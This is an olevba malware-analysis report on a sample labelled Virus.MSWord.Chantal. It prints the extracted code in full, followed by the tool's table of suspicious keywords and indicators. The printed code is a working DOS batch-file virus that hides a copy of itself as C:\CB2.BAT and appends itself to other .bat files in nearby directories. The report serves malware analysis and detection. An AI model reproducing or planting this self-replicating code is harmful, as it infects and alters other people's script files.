olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chantal-f9924131e3ac9e00934c78b7c61672a79c32413a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Chantal-f9924131e3ac9e00934c78b7c61672a79c32413a 
in file: Virus.MSWord.Chantal-f9924131e3ac9e00934c78b7c61672a79c32413a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@echo off%[CB2_B]%
IF '%1=='## GOTO CB2_%2
ATTRIB C:\CB2.BAT +h
IF EXIST C:\CB2.BAT GOTO CB2_
IF NOT EXIST %0.BAT GOTO CB2_END
FIND "CB2"<%0.BAT>C:\CB2.BAT
:CB2_
COMMAND /e:5000 /c C:\CB2 ## RUN
GOTO CB2_END
:CB2_RUN
FOR %%i IN (*.bat ..\*.bat) DO CALL C:\CB2 ## INF %%i
EXIT CB2
:CB2_INF
IF '%CB2%=='1111111111111 EXIT
SET CB2=%CB2%1
FIND "CB2"<%3>NUL
IF NOT ERRORLEVEL 1 goto CB2_END
TYPE %3>CB2
TYPE C:\CB2.BAT>>CB2
MOVE CB2 %3>NUL
EXIT CB2
:CB2_END
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CB2.BAT             |Executable file name                         |
|IOC       |0.BAT               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

